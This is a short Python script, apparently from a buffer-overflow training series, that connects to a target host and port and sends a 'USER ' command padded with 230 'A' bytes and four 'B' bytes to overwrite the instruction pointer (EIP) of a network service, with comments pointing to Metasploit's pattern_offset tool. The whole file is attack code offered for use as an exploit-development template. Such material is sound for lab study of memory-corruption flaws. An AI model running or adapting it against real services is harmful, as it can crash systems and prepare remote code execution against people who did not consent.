#!/usr/bin/python

#SKELETON SCRIPT FOR FUZZING SOFTWARES REMOTELY, USEFUL FOR OVERFLOWS OVER THE NETWORK
#FIND PATTERN OFFSET USING /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <length> -q <string query in EIP>
#Follow me on twitter @acc3ssp0int

import socket
import sys
import time


if len(sys.argv) < 3:
	print("Usage: python 03-eip_overwrite.py $TargetIP $Port")
	sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = 'USER ' #Modify This as per software
#Modify This x41 as per offset found
junk = '\x41' * 230 + '\x42' * 4 
end = '\r\n' #Modify This as per software

buffer = cmd + junk + end

print("Created by acc3ssp0int, follow my content on https://acc3ssp0int.com, Thanks!")
time.sleep(3)
print("Passing Buffer in 3 seconds...")
time.sleep(3)
s.connect((host,port))
s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
print("Done! Check your debugger :)")
time.sleep(1)
print("Exiting...")
time.sleep(1)
